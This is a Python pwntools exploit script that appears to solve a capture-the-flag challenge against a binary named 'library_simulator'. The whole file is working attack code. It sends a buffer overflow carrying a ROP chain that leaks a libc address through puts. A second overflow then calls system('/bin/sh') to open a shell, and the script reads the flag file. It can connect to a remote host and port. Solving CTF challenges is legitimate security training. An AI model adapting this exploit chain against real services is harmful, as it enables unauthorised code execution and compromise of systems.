#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("../src/library_simulator")
libc = ELF("../src/libc.so.6")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


MAIN_ADDR = 0x40140D


if len(sys.argv) == 3:
    try:
        address = sys.argv[1]
        port = int(sys.argv[2])
        args.REMOTE = True
    except:
        pass

def conn():
    if args.REMOTE:
        r = remote(address, port)
    else:
        r = process([exe.path], cwd="../src")

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/opt/pwndbg/gdbinit.py
b*main+516
c
        """)


def main():
    global r
    r = conn()
    attach_gdb()


    # step 1: leak libc
    rop = ROP(exe)
    rop.call(exe.plt["puts"], [exe.got["puts"]])
    rop.call(MAIN_ADDR)

    r.sendlineafter(b"> ", b"b")
    r.sendlineafter(b"length: ", b"0")
    r.sendlineafter(b"Title: ", b"A"*0x38 + rop.chain())

    r.recvuntil(b"not found\n")
    leak = r.recvline()[:-1]
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.sym["puts"]

    print(f"libc @ {hex(libc.address)}")

    # step 2: ret2system
    rop = ROP(libc)
    rop.call(rop.find_gadget(["ret"])) # movaps issue
    rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh\x00"))])

    r.sendlineafter(b"> ", b"b")
    r.sendlineafter(b"length: ", b"0")
    r.sendlineafter(b"Title: ", b"A"*0x38 + rop.chain())

    r.sendline(b"cat /challenge/flag.txt")

    r.interactive()

if __name__ == "__main__":
    main()
